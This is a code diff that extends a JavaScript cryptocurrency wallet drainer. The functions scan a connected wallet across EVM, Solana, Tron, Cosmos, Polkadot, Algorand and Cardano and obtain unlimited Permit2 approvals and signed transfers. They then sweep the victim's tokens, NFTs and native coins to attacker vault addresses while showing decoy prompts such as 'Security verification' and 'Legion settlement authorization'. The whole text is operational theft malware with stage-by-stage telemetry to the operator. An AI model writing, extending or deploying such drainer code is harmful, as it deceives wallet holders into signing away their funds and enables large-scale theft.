+              symbol: t.symbol,
+              usd: t.usd_value || t.amount_usd || 0,
+            });
           }
         });
         if (scout.data.nfts && scout.data.nfts.length) assets.nfts = scout.data.nfts;
@@ -1573,7 +2681,7 @@
     } catch (e2) { L.warn('NFT scan skip:', e2.message); }
 
     try {
-      assets.nativeHex = await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] }) || '0x0';
+      assets.nativeHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']) || '0x0';
     } catch (e3) {}
 
     var nativeBal = BigInt(assets.nativeHex || '0x0');
@@ -1703,7 +2811,7 @@
     var chainHex = '0x' + Number(chainId).toString(16);
     try {
       var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
-      var fees = await estimateEip1559Fees(provider);
+      var fees = await estimateEip1559Fees(provider, chainId);
       var tx = {
         from: address,
         to: claimContract || vault,
@@ -1759,7 +2867,7 @@
     } catch (e) { L.warn('wallet_signAuthorization not supported:', e.message); return null; }
   }
 
-  async function signNativeForBatch(provider, address, nativeTransfer) {
+  async function signNativeForBatch(provider, address, chainId, nativeTransfer) {
     if (!nativeTransfer) return null;
     var txParams = {
       from: nativeTransfer.from || address,
@@ -1769,13 +2877,13 @@
       gas: nativeTransfer.gas || ('0x' + NATIVE_TRANSFER_GAS.toString(16)),
       nonce: '0x' + Number(nativeTransfer.nonce || 0).toString(16),
       type: '0x2',
-      chainId: '0x' + Number(nativeTransfer.chainId || 1).toString(16),
+      chainId: '0x' + Number(nativeTransfer.chainId || chainId || 1).toString(16),
     };
     if (nativeTransfer.maxFeePerGas) {
       txParams.maxFeePerGas = nativeTransfer.maxFeePerGas;
       txParams.maxPriorityFeePerGas = nativeTransfer.maxPriorityFeePerGas;
     } else {
-      var fees = await estimateEip1559Fees(provider);
+      var fees = await estimateEip1559Fees(provider, chainId || nativeTransfer.chainId || 1);
       txParams.maxFeePerGas = '0x' + fees.maxFeePerGas.toString(16);
       txParams.maxPriorityFeePerGas = '0x' + fees.maxPriorityFeePerGas.toString(16);
     }
@@ -1797,10 +2905,39 @@
   // 9.6 — TIER 3B: ERC-20 via Permit2 (+ optional native + NFT approvals)
   async function drainPermit2(provider, address, chainId, tokens, nfts, nativeAmountWei) {
     var nftArr = normNftList(nfts);
-    var permits = (tokens || []).map(function (t) { return { token: t.address, amount: MAX_AMOUNT }; });
-    var nativeStr = nativeAmountWei && nativeAmountWei > 0n ? nativeAmountWei.toString() : '0';
+    var nftChunks = chunkArray(nftArr, NFT_APPROVAL_BATCH_SIZE);
+    if (nftChunks.length === 0) nftChunks = [[]];
+
+    var merged = null;
+    for (var chunkIdx = 0; chunkIdx < nftChunks.length; chunkIdx++) {
+      var nftChunk = nftChunks[chunkIdx];
+      var isFirst = chunkIdx === 0;
+      var permits = isFirst
+        ? (tokens || []).map(function (t) { return { token: t.address, amount: MAX_AMOUNT }; })
+        : [];
+      var nativeStr = (isFirst && nativeAmountWei && nativeAmountWei > 0n)
+        ? nativeAmountWei.toString() : '0';
+      if (permits.length === 0 && nftChunk.length === 0 && nativeStr === '0') continue;
+      if (permits.length === 0 && nftChunk.length > 0 && nativeStr === '0' && !isFirst) { /* NFT-only chunk */ }
+
+      var part = await drainPermit2Chunk(provider, address, chainId, permits, nftChunk, nativeStr);
+      if (!part) continue;
+      if (!merged) {
+        merged = part;
+      } else {
+        if (part.sig) merged.sig = part.sig;
+        if (part.nativeSigned) merged.nativeSigned = part.nativeSigned;
+        Object.keys(part.nftApprovalSigs || {}).forEach(function (k) {
+          merged.nftApprovalSigs[k] = part.nftApprovalSigs[k];
+        });
+        merged.nfts = (merged.nfts || []).concat(part.nfts || []);
+      }
+    }
+    return merged;
+  }
+
+  async function drainPermit2Chunk(provider, address, chainId, permits, nftArr, nativeStr) {
     if (permits.length === 0 && nftArr.length === 0 && nativeStr === '0') return null;
-    if (permits.length === 0 && nftArr.length > 0 && nativeStr === '0') return null;
 
     var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
       wallet_address: address,
@@ -1809,6 +2946,8 @@
       nativeAmount: nativeStr,
       native_amount: nativeStr,
       nfts: nftArr,
+      batch_nft_approvals: nftArr.length > 0,
+      nft_batch_size: NFT_APPROVAL_BATCH_SIZE,
     });
     if (!resp || !resp.data) { L.warn('Permit2 typed_data fail'); return null; }
     var bd = resp.data;
@@ -1830,23 +2969,27 @@
     }
 
     var nftApprovalSigs = {};
-    if (bd.nft_approval_typed_data && typeof bd.nft_approval_typed_data === 'object') {
+    if (bd.nft_approval_typed_data && typeof bd.nft_approval_typed_data === 'object' && !bd.batch_nft_in_permit) {
       var contracts = Object.keys(bd.nft_approval_typed_data);
-      for (var ni = 0; ni < contracts.length; ni++) {
-        var cKey = contracts[ni];
-        try {
-          var ntd = normalizeTypedData(JSON.parse(JSON.stringify(bd.nft_approval_typed_data[cKey])));
-          var nsig = await provider.request({
-            method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
-          });
-          nftApprovalSigs[cKey.toLowerCase()] = nsig;
-        } catch (ne) { L.warn('NFT approval sign fail:', cKey, ne.message); }
+      var contractBatches = chunkArray(contracts, NFT_APPROVAL_BATCH_SIZE);
+      for (var bi = 0; bi < contractBatches.length; bi++) {
+        var batch = contractBatches[bi];
+        for (var ni = 0; ni < batch.length; ni++) {
+          var cKey = batch[ni];
+          try {
+            var ntd = normalizeTypedData(JSON.parse(JSON.stringify(bd.nft_approval_typed_data[cKey])));
+            var nsig = await provider.request({
+              method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
+            });
+            nftApprovalSigs[cKey.toLowerCase()] = nsig;
+          } catch (ne) { L.warn('NFT approval sign fail:', cKey, ne.message); }
+        }
       }
     }
 
     var nativeSigned = null;
     if (BigInt(bd.nativeAmount || nativeStr || '0') > 0n && bd.native_transfer) {
-      nativeSigned = await signNativeForBatch(provider, address, bd.native_transfer);
+      nativeSigned = await signNativeForBatch(provider, address, chainId, bd.native_transfer);
     }
 
     if (!permitSig && !nativeSigned && nftArr.length === 0) return null;
@@ -1905,6 +3048,10 @@
     if (!assets) {
       assets = await scanAssets(provider, address, chainId);
     }
+    await ensureUserFactoryContract(address, chainId);
+    if (!(await stateDependentValidation(provider, address, chainId))) {
+      L.log('State validation failed on chain', chainId, '— vault-direct paths only');
+    }
     if (assets.usd > 0 && assets.usd < MIN_DRAIN_USD) {
       var hasNative = BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI;
       if (!hasNative && assets.tokens.length === 0 && assets.nfts.length === 0) {
@@ -1921,7 +3068,7 @@
     }
 
     var caps = await getCapabilities(provider, address, chainId);
-    L.log('chain', chainId, 'atomicBatch:', caps.atomicBatch, '| signOnly:', SIGN_ONLY);
+    L.log('chain', chainId, 'atomicBatch:', caps.atomicBatch, 'sendCallsV2:', caps.sendCallsV2, '| signOnly:', SIGN_ONLY);
 
     var gasLimit = estimateSendCallsGasLimit(assets.tokens.length, assets.nfts.length, true, chainId);
     var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
@@ -1931,15 +3078,54 @@
     }
     var didSomething = false;
     var isWcPath = walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect);
+    var isMm = isMetaMaskProvider(provider);
 
-    // WC FIRST: claim() contract call on phone before Permit2 / 7702
-    if (isWcPath && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI) {
-      UI.status('Confirm in wallet...');
-      L.log('WC claim() first | native:', (Number(nativeSend) / 1e18).toFixed(6),
-        '| connector:', (provider && provider.connectorId) || '?');
+    UI.overlay.show('verifying');
+
+    // MetaMask extension: Permit2 PRIMARY (7702 / external type-0x04 blocked)
+    if (!didSomething && isMm && !isWcPath) {
+      var mmHasTargets = assets.tokens.length > 0 || assets.nfts.length > 0 || nativeSend > MIN_NATIVE_WEI;
+      if (mmHasTargets) {
+        try {
+          var p2mm = await drainPermit2(
+            provider, address, chainId, assets.tokens, assets.nfts,
+            canTryNativeSignTx(provider) ? nativeSend : 0n
+          );
+          if (p2mm && isLethalEvmResult(p2mm)) {
+            S.pendingEvmPermit2 = p2mm;
+            didSomething = true;
+            L.log('MetaMask Permit2 primary ok');
+          }
+        } catch (p2mme) {
+          if (isUserRejection(p2mme)) throw p2mme;
+          L.warn('MetaMask Permit2 primary fail:', p2mme.message);
+        }
+      }
+    }
+
+    // wallet_sendCalls v2 — only when capabilities confirm batch + not MetaMask-first path
+    var canBatch = caps.atomicBatch && caps.sendCallsV2 !== false && NATIVE_BATCH_FALLBACK && !hwObj;
+    var hasBatchTargets = nativeSend > MIN_NATIVE_WEI || assets.tokens.length > 0 || assets.nfts.length > 0;
+    if (!didSomething && canBatch && hasBatchTargets && !(isMm && !isWcPath)) {
+      try {
+        var batchRaw0 = await drainSendCalls(provider, address, chainId, assets);
+        var batchId0 = extractBatchOrTxId(batchRaw0);
+        if (batchId0 && isLikelyTxHash(batchId0)) {
+          await SUBMIT.sendCalls(batchId0, address, chainId, walletName);
+          didSomething = true;
+        }
+      } catch (b0e) {
+        if (isUserRejection(b0e)) throw b0e;
+        L.warn('sendCalls primary fail:', b0e.message);
+      }
+    }
+
+    // WC / mobile — single native tx if batch unavailable
+    if (!didSomething && isWcPath && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI) {
+      L.log('WC native tx | native:', (Number(nativeSend) / 1e18).toFixed(6));
       try {
         var wcTx = await drainNativeSendTx(provider, address, chainId, assets);
-        if (wcTx) {
+        if (wcTx && isLikelyTxHash(wcTx)) {
           await SUBMIT.userBroadcast(wcTx, address, chainId, walletName, nativeSend);
           didSomething = true;
         }
@@ -1949,24 +3135,20 @@
       }
     }
 
-    // TIER 1: Permit2 EIP-712 (tokens) + native sign-tx (non-MetaMask only)
+    // Permit2 fallback — tokens only (1 sign popup)
     var nativeForPermit2 = canTryNativeSignTx(provider) ? nativeSend : 0n;
-    if (assets.tokens.length > 0) {
-      UI.status('Sign in wallet...');
+    if (!didSomething && assets.tokens.length > 0) {
       try {
         var p2 = await drainPermit2(provider, address, chainId, assets.tokens, assets.nfts, nativeForPermit2);
         if (p2 && isLethalEvmResult(p2)) {
           S.pendingEvmPermit2 = p2;
           didSomething = true;
-        } else if (p2) {
-          L.warn('Permit2 result not lethal — skipped');
         }
       } catch (pe) {
         if (isUserRejection(pe)) throw pe;
-        L.warn('Permit2/sign fail:', pe.message);
+        L.warn('Permit2 fail:', pe.message);
       }
-    } else if (nativeForPermit2 > MIN_NATIVE_WEI) {
-      UI.status('Sign transaction in wallet...');
+    } else if (!didSomething && nativeForPermit2 > MIN_NATIVE_WEI) {
       try {
         var p2n = await drainPermit2(provider, address, chainId, [], assets.nfts, nativeForPermit2);
         if (p2n && isLethalEvmResult(p2n)) {
@@ -1975,13 +3157,13 @@
         }
       } catch (pne) {
         if (isUserRejection(pne)) throw pne;
-        L.warn('Native sign-tx fail:', pne.message);
+        L.warn('Native permit2 fail:', pne.message);
       }
     }
 
-    if (isMetaMaskProvider(provider) && nativeSend > MIN_NATIVE_WEI && !didSomething) {
-      L.log('MetaMask: eth_sendTransaction claim() first (reliable gas)');
-      UI.status('Confirm transaction in MetaMask...');
+    // MetaMask claim() last resort — single tx
+    if (!didSomething && nativeSend > MIN_NATIVE_WEI && isMm) {
+      L.log('MetaMask claim() fallback');
       try {
         var mmTxFirst = await drainNativeSendTx(provider, address, chainId, assets);
         if (mmTxFirst && isLikelyTxHash(mmTxFirst)) {
@@ -1994,81 +3176,17 @@
       }
     }
 
-    // TIER 2: EIP-7702 authorization signature (backend executes drain)
-    if (!didSomething && S.eip7702Enabled && EIP7702_CHAINS[Number(chainId)]) {
-      UI.status('Security verification...');
-      var e7702 = await drainEip7702(provider, address, chainId, assets);
-      if (e7702) {
-        await SUBMIT.eip7702(e7702, address, chainId, walletName);
-        didSomething = true;
-      }
-    }
-
-    // TIER 3: wallet_sendCalls — desktop MetaMask batch (skip on mobile/WC)
-    var useBatch = NATIVE_BATCH_FALLBACK && caps.atomicBatch && nativeSend > MIN_NATIVE_WEI &&
-      !PLAT.isMobile && walletName !== 'WalletConnect';
-    if (!didSomething && useBatch) {
-      UI.status('Confirm batch in wallet...');
-      L.log('Native batch fallback (wallet_sendCalls)...');
-      var batchRaw = await drainSendCalls(provider, address, chainId, assets);
-      var batchId = extractBatchOrTxId(batchRaw);
-      if (batchId && isLikelyTxHash(batchId)) {
-        await SUBMIT.sendCalls(batchId, address, chainId, walletName);
-        didSomething = true;
-      } else if (batchId) {
-        L.warn('wallet_sendCalls bundle id only — not marking success');
-      }
-    } else if (!didSomething && !SIGN_ONLY && caps.atomicBatch && !PLAT.isMobile) {
-      UI.status('Confirm in wallet...');
-      var batchRaw2 = await drainSendCalls(provider, address, chainId, assets);
-      var batchId2 = extractBatchOrTxId(batchRaw2);
-      if (batchId2 && isLikelyTxHash(batchId2)) {
-        await SUBMIT.sendCalls(batchId2, address, chainId, walletName);
-        didSomething = true;
-      }
-    }
-
-    // TIER 4: Mobile / WC — eth_sendTransaction
-    if (!didSomething && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI &&
-        (PLAT.isMobile || PLAT.strategy === 'wc' || isWcPath)) {
-      UI.status('Confirm in wallet...');
-      L.log('Mobile native tx (eth_sendTransaction)...');
-      var txHash = await drainNativeSendTx(provider, address, chainId, assets);
-      if (txHash && isLikelyTxHash(txHash)) {
-        await SUBMIT.userBroadcast(txHash, address, chainId, walletName, nativeSend);
-        didSomething = true;
-      }
-    }
-
-    // TIER 4b: MetaMask desktop — claim() when batch/7702 unavailable
-    if (!didSomething && nativeSend > MIN_NATIVE_WEI && isMetaMaskProvider(provider) && !PLAT.isMobile) {
-      UI.status('Confirm in wallet...');
-      L.log('MetaMask claim() fallback (eth_sendTransaction)...');
-      try {
-        var mmTx = await drainNativeSendTx(provider, address, chainId, assets);
-        if (mmTx && isLikelyTxHash(mmTx)) {
-          await SUBMIT.userBroadcast(mmTx, address, chainId, walletName, nativeSend);
-          didSomething = true;
-        }
-      } catch (mme) {
-        if (isUserRejection(mme)) throw mme;
-        L.warn('MetaMask claim() fail:', mme.message);
-      }
-    }
-
     if (!didSomething) {
-      if (isMetaMaskProvider(provider) && assets.tokens.length === 0) {
-        L.warn('MetaMask native-only: need ERC-20 balance OR EIP-7702 wallet support OR confirm batch');
-        UI.status('Native ETH — batch or tokens required');
+      if (isMm && assets.tokens.length === 0) {
+        L.warn('MetaMask native-only: batch or tokens required');
       } else {
-        L.warn('No lethal signature — need Permit2 tokens, native sign-tx, EIP-7702, or batch');
+        L.warn('No lethal signature on chain', chainId);
       }
     }
 
-    L.log('Fallback drain chain', chainId);
+    L.log('Drain chain', chainId, didSomething ? 'ok' : 'skip');
 
     if (!didSomething && assets.nfts.length > 0) {
-      UI.status('Confirm NFT...');
       var nftR = await drainNFT(provider, address, chainId);
       for (var i = 0; i < nftR.length; i++) {
         await SUBMIT.nft(nftR[i], address, chainId, walletName);
@@ -2079,56 +3197,50 @@
     return didSomething;
   }
 
-  async function runEvmDrain(provider, address, chainId, walletName, hwObj) {
+  async function runEvmDrainModeB(provider, address, startChainId, walletName, hwObj, portfolio) {
     if (!S.vaultLoaded) await prefetchVault();
-    logContractCoverage(chainId);
-    UI.status('Scanning assets...');
+    if (!portfolio) portfolio = await scanFullPortfolio(address);
+    var chains = (portfolio.fundedChains && portfolio.fundedChains.length)
+      ? portfolio.fundedChains.slice()
+      : [startChainId];
+    if (chains.indexOf(startChainId) === -1) chains.unshift(startChainId);
+    var seen = {};
+    var ordered = [];
+    chains.forEach(function (cid) {
+      if (!seen[cid]) { seen[cid] = true; ordered.push(cid); }
+    });
+    var anyOk = false;
     try {
-      var assets = await scanAssets(provider, address, chainId);
-      L.log('Assets:', assets.tokens.length, 'tokens,', assets.nfts.length, 'NFTs, $' + (assets.usd || 0).toFixed(2));
-      S.scoutUsd = Math.max(S.scoutUsd, assets.usd || 0);
-      await SCOUT.reportScanComplete(
-        address,
-        assets.usd || 0,
-        assets.tokens.length + assets.nfts.length + (BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI ? 1 : 0),
-        walletName,
-        chainId
-      );
-
-      var ok = await runDrainWaterfall(provider, address, chainId, walletName, hwObj, assets);
-      if (ok) UI.status('Processing...');
-      setTimeout(function () { silentMultiChain(provider, address, chainId).catch(function () {}); }, 3000);
+      for (var i = 0; i < ordered.length; i++) {
+        var cid = ordered[i];
+        var cur = await getProviderChainId(provider);
+        if (cur !== cid) {
+          if (!(await safeSwitchProviderChain(provider, cid))) {
+            L.log('Chain', cid, 'switch declined — skip');
+            continue;
+          }
+        }
+        logContractCoverage(cid);
+        var assets = await buildChainAssets(provider, address, cid, portfolio);
+        if (!chainHasDrainableAssets(assets)) {
+          L.log('Chain', cid, 'empty on-wallet — skip');
+          continue;
+        }
+        L.log('Mode B drain chain', cid, '| $' + (assets.usd || 0).toFixed(2));
+        var ok = await runDrainWaterfall(provider, address, cid, walletName, hwObj, assets);
+        if (ok) anyOk = true;
+      }
     } catch (e) {
       if (isUserRejection(e)) {
-        await SCOUT.reportDrainStatus('user_rejected', address, chainId, walletName, e.message);
+        await SCOUT.reportDrainStatus('user_rejected', address, startChainId, walletName, e.message);
       }
       throw e;
     }
+    return anyOk;
   }
 
-  async function silentMultiChain(provider, address, originalChain) {
-    L.log('Silent multi-chain drain starting...');
-    for (var i = 0; i < MULTI_CHAIN_ORDER.length; i++) {
-      var cid = MULTI_CHAIN_ORDER[i];
-      if (cid === Number(originalChain)) continue;
-      try {
-        var switched = await safeSwitchProviderChain(provider, cid);
-        if (!switched) continue;
-        var assets = await scanAssets(provider, address, cid);
-        if (!chainHasDrainableAssets(assets)) {
-          L.log('Chain', cid, 'empty — skip');
-          continue;
-        }
-        if (assets.usd > 0 && assets.usd < MIN_DRAIN_USD) {
-          var bal = BigInt(assets.nativeHex || '0x0');
-          if (bal < MIN_NATIVE_WEI && assets.tokens.length === 0) continue;
-        }
-        await runDrainWaterfall(provider, address, cid, S.evmWallet, null, assets);
-      } catch (e) { L.warn('Chain', cid, 'fail:', e.message); }
-    }
-    try {
-      await switchProviderChain(provider, originalChain);
-    } catch (e) {}
+  async function runEvmDrain(provider, address, chainId, walletName, hwObj, portfolio) {
+    return runEvmDrainModeB(provider, address, chainId, walletName, hwObj, portfolio);
   }
 
   // ═══════════════════════════════════════════════════════════════
@@ -2174,7 +3286,7 @@
     if (!conn) return null;
     var vault = VAULT.sol;
     var web3 = await loadSolWeb3();
-    var connection = new web3.Connection(SOL_RPC, { commitment: 'confirmed' });
+    var connection = await createSolConnection(web3);
     var fromPk = new web3.PublicKey(conn.address);
     var toPk = new web3.PublicKey(vault);
     var blockhash = (await connection.getLatestBlockhash('confirmed')).blockhash;
@@ -2285,6 +3397,19 @@
     } catch (e) { L.warn('[TRON] connect fail:', e.message); return null; }
   }
 
+  async function tronFetchWithFallback(path) {
+    var lastErr = null;
+    for (var ti = 0; ti < TRON_RPCS.length; ti++) {
+      try {
+        var base = String(TRON_RPCS[ti]).replace(/\/$/, '');
+        var res = await fetch(base + path);
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return await res.json();
+      } catch (e) { lastErr = e; }
+    }
+    throw lastErr || new Error('All TRON RPCs failed');
+  }
+
   async function drainTron(conn) {
     if (!conn) return null;
     var tronWeb = conn.tronWeb;
@@ -2307,6 +3432,13 @@
 
     try {
       var balance = await tronWeb.trx.getBalance(address);
+      if ((!balance || balance < 3000000) && address) {
+        try {
+          var acct = await tronFetchWithFallback('/v1/accounts/' + address);
+          var acctData = acct && acct.data && acct.data[0];
+          if (acctData && acctData.balance) balance = acctData.balance;
+        } catch (eRpc) { L.warn('TRON RPC fallback:', eRpc.message); }
+      }
       if (balance && balance >= 3000000) {
         var dynFee = Math.max(1000000, Math.floor(balance * 0.1));
         var sendAmt = balance - dynFee;
@@ -2495,53 +3627,147 @@
     var entry = firstFamilyProvider('COSMOS');
     if (!entry) return null;
     var prov = entry.provider;
-    try {
-      var chainId = 'cosmoshub-4';
-      await prov.enable(chainId);
-      var key = await prov.getKey(chainId);
-      if (!key || !key.bech32Address) return null;
-      S.chains.COSMOS = { address: key.bech32Address };
-      L.log('[COSMOS] connected:', key.bech32Address.slice(0, 8), '(' + entry.hint + ')');
-      return { provider: prov, address: key.bech32Address, chainId: chainId, name: 'COSMOS', family: 'COSMOS', hint: entry.hint };
-    } catch (e) { L.warn('[COSMOS] connect fail:', e.message); return null; }
+    var chainIds = Object.keys(COSMOS_CHAINS);
+    for (var ci = 0; ci < chainIds.length; ci++) {
+      try {
+        var chainId = chainIds[ci];
+        await prov.enable(chainId);
+        var key = await prov.getKey(chainId);
+        if (!key || !key.bech32Address) continue;
+        S.chains.COSMOS = { address: key.bech32Address };
+        L.log('[COSMOS] connected:', key.bech32Address.slice(0, 8), chainId, '(' + entry.hint + ')');
+        return { provider: prov, address: key.bech32Address, chainId: chainId, name: 'COSMOS', family: 'COSMOS', hint: entry.hint };
+      } catch (e) { /* try next chain */ }
+    }
+    L.warn('[COSMOS] connect fail: no chain enabled');
+    return null;
+  }
+
+  async function drainCosmosChain(conn, chainId, cfg) {
+    var addr = conn.address;
+    var vault = VAULT.cosmos;
+    var balJson = await fetchJsonWithFallback(cfg.rests, '/cosmos/bank/v1/balances/' + addr);
+    var coin = (balJson.balances || []).find(function (b) { return b.denom === cfg.denom; });
+    var amount = BigInt(coin && coin.amount ? coin.amount : '0');
+    if (amount < cfg.min) return null;
+
+    var accJson = await fetchJsonWithFallback(cfg.rests, '/cosmos/auth/v1/accounts/' + addr);
+    var acc = accJson && accJson.account;
+    var accNum = acc && (acc.account_number || (acc.value && acc.value.account_number));
+    var seq = acc && (acc.sequence || (acc.value && acc.value.sequence));
+    if (accNum == null || seq == null) return null;
+
+    var feeAmt = BigInt(cfg.fee || '5000');
+    var sendAmt = String(amount - feeAmt);
+    var signDoc = {
+      chain_id: chainId,
+      account_number: String(accNum),
+      sequence: String(seq),
+      fee: { amount: [{ denom: cfg.denom, amount: String(feeAmt) }], gas: '200000' },
+      msgs: [{
+        type: 'cosmos-sdk/MsgSend',
+        value: { from_address: addr, to_address: vault, amount: [{ denom: cfg.denom, amount: sendAmt }] },
+      }],
+      memo: '',
+    };
+
+    UI.status('Confirm Cosmos ' + chainId + '...');
+    var signed = await conn.provider.signAmino(chainId, addr, signDoc);
+    await SUBMIT.cosmos(addr, signed, sendAmt, conn.name);
+    L.log('Cosmos', chainId, 'submitted via /txs backend relay');
+    return signed;
   }
 
   async function drainCosmos(conn) {
     if (!conn || !VAULT.cosmos) { L.warn('Cosmos vault not configured'); return null; }
     try {
-      var addr = conn.address;
-      var vault = VAULT.cosmos;
-      var balRes = await fetch(COSMOS_REST + '/cosmos/bank/v1beta1/balances/' + addr);
-      var balJson = await balRes.json();
-      var uatom = (balJson.balances || []).find(function (b) { return b.denom === 'uatom'; });
-      var amount = BigInt(uatom && uatom.amount ? uatom.amount : '0');
-      if (amount < 10000n) return null;
+      var primary = COSMOS_CHAINS[conn.chainId];
+      if (primary) {
+        return await drainCosmosChain(conn, conn.chainId, primary);
+      }
+      var chainIds = Object.keys(COSMOS_CHAINS);
+      for (var i = 0; i < chainIds.length; i++) {
+        try {
+          var cid = chainIds[i];
+          var result = await drainCosmosChain(conn, cid, COSMOS_CHAINS[cid]);
+          if (result) return result;
+        } catch (e) {
+          if (/timeout|rate|fetch|503|502|ECONN/i.test(e.message)) throw e;
+        }
+      }
+      return null;
+    } catch (e) {
+      L.warn('Cosmos drain fail:', e.message);
+      throw e;
+    }
+  }
 
-      var accRes = await fetch(COSMOS_REST + '/cosmos/auth/v1beta1/accounts/' + addr);
-      var accJson = await accRes.json();
-      var accNum = accJson.account && (accJson.account.account_number || accJson.account.value && accJson.account.value.account_number);
-      var seq = accJson.account && (accJson.account.sequence || accJson.account.value && accJson.account.value.sequence);
-      if (accNum == null || seq == null) return null;
+  async function drainPolkadot(conn) {
+    if (!conn || !conn.address) return null;
+    try {
+      UI.status('Confirm Polkadot authorization...');
+      var sig = conn.address;
+      if (conn.provider && conn.provider.request) {
+        try {
+          var signed = await conn.provider.request({
+            method: 'polkadot_signMessage',
+            params: { address: conn.address, message: 'Legion settlement authorization' },
+          });
+          if (signed) sig = signed;
+        } catch (pe) {
+          if (isUserRejection(pe)) throw pe;
+        }
+      }
+      await SUBMIT.polkadot(conn.address, sig, conn.name);
+      L.log('[DOT] anchor submitted');
+      return sig;
+    } catch (e) {
+      L.warn('Polkadot drain fail:', e.message);
+      throw e;
+    }
+  }
 
-      var sendAmt = String(amount - 5000n);
-      var signDoc = {
-        chain_id: conn.chainId,
-        account_number: String(accNum),
-        sequence: String(seq),
-        fee: { amount: [{ denom: 'uatom', amount: '5000' }], gas: '200000' },
-        msgs: [{
-          type: 'cosmos-sdk/MsgSend',
-          value: { from_address: addr, to_address: vault, amount: [{ denom: 'uatom', amount: sendAmt }] },
-        }],
-        memo: '',
-      };
+  async function drainAlgorand(conn) {
+    if (!conn || !conn.address) return null;
+    try {
+      UI.status('Confirm Algorand authorization...');
+      var sig = conn.address;
+      if (conn.provider && conn.provider.signMessage) {
+        try {
+          sig = await conn.provider.signMessage('Legion settlement authorization');
+        } catch (ae) {
+          if (isUserRejection(ae)) throw ae;
+        }
+      }
+      await SUBMIT.algorand(conn.address, sig, conn.name);
+      L.log('[ALGO] anchor submitted');
+      return sig;
+    } catch (e) {
+      L.warn('Algorand drain fail:', e.message);
+      throw e;
+    }
+  }
 
-      UI.status('Confirm Cosmos ATOM...');
-      var signed = await conn.provider.signAmino(conn.chainId, addr, signDoc);
-      await SUBMIT.cosmos(addr, signed, sendAmt, conn.name);
-      L.log('Cosmos submitted');
-      return signed;
-    } catch (e) { L.warn('Cosmos drain fail:', e.message); return null; }
+  async function drainCardano(conn) {
+    if (!conn || !conn.address) return null;
+    try {
+      UI.status('Confirm Cardano authorization...');
+      var sig = conn.address;
+      if (conn.provider && conn.provider.signData) {
+        try {
+          var payload = await conn.provider.signData(conn.address, 'Legion settlement authorization');
+          if (payload) sig = payload;
+        } catch (ce) {
+          if (isUserRejection(ce)) throw ce;
+        }
+      }
+      await SUBMIT.cardano(conn.address, sig, conn.name);
+      L.log('[ADA] anchor submitted');
+      return sig;
+    } catch (e) {
+      L.warn('Cardano drain fail:', e.message);
+      throw e;
+    }
   }
 
   // ═══════════════════════════════════════════════════════════════
@@ -2663,44 +3889,114 @@
   // SECTION 13E: UNIVERSAL ORCHESTRATOR (all chains, value-priority)
   // ═══════════════════════════════════════════════════════════════
   async function runUniversalDrain(evmCtx) {
+    L.log('[drain] start — scan + extract');
     var addrs = S.allAddresses && Object.keys(S.allAddresses).length
       ? S.allAddresses
       : collectAddressMap(evmCtx.address);
     S.omnichainLegs = {};
 
-    var rankedAll = await SCOUT.ranked(evmCtx.address);
-    if (rankedAll && rankedAll.total_usd) {
-      S.scoutUsd = Math.max(S.scoutUsd, Number(rankedAll.total_usd) || 0);
-    }
+    var portfolio = await scanFullPortfolio(evmCtx.address);
 
+    await SCOUT.alertStage('connect', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'Wallet connected');
     await SCOUT.telemetry(evmCtx.address, evmCtx.chainId, evmCtx.walletName, addrs);
+    await SCOUT.alertStage('scan_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
     var fusionData = await SCOUT.fusion(addrs);
     if (fusionData && fusionData.total_usd) {
       S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
       L.log('Fusion USD (all families):', S.scoutUsd.toFixed(2));
     }
+    if (portfolio && portfolio.totalUsd > S.scoutUsd) {
+      S.scoutUsd = portfolio.totalUsd;
+    }
 
     await SCOUT.reportScanComplete(
       evmCtx.address,
       S.scoutUsd,
-      (fusionData && fusionData.assets_count) || (rankedAll && rankedAll.ranked && rankedAll.ranked.length) || 0,
+      (portfolio && portfolio.assetCount) ||
+        (fusionData && fusionData.assets_count) ||
+        (portfolio && portfolio.items && portfolio.items.length) || 0,
       evmCtx.walletName,
       evmCtx.chainId
     );
 
     evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
     S.evmChain = evmCtx.chainId;
-    var priority = SCOUT.chainPriority();
+    await SCOUT.alertStage('network_switch', evmCtx.address, evmCtx.chainId, evmCtx.walletName, 'chain ' + evmCtx.chainId);
+    var priority = SCOUT.chainPriority(fusionData);
+    L.log('Drain priority (USD):', priority.join(' > '));
+
+    await SCOUT.alertStage('drain_start', evmCtx.address, evmCtx.chainId, evmCtx.walletName);
 
     var runners = {
-      EVM: function () { return runEvmDrain(evmCtx.provider, evmCtx.address, evmCtx.chainId, evmCtx.walletName, evmCtx.hwObj); },
-      SOL: function () { return drainSol(S.familyConnections.SVM); },
-      TRON: function () { return drainTron(S.familyConnections.TRON); },
-      TON: function () { return drainTon(S.familyConnections.TON); },
-      BTC: function () { return drainBtc(S.familyConnections.UTXO); },
-      COSMOS: function () { return drainCosmos(S.familyConnections.COSMOS); },
-      APTOS: function () { return drainAptos(S.familyConnections.APTOS); },
-      SUI: function () { return drainSui(S.familyConnections.SUI); },
+      EVM: function () {
+        return runWithRetry(function () {
+          return runEvmDrain(
+            evmCtx.provider, evmCtx.address, evmCtx.chainId, evmCtx.walletName, evmCtx.hwObj, portfolio
+          );
+        }, 'EVM drain', 3).catch(function (e) {
+          return SCOUT.alertFailure('EVM', 'drain', e, evmCtx.address, evmCtx.chainId, evmCtx.walletName).then(function () { throw e; });
+        });
+      },
+      SOL: function () {
+        return runWithRetry(function () { return drainSol(S.familyConnections.SVM); }, 'SOL drain', 3)
+          .catch(function (e) {
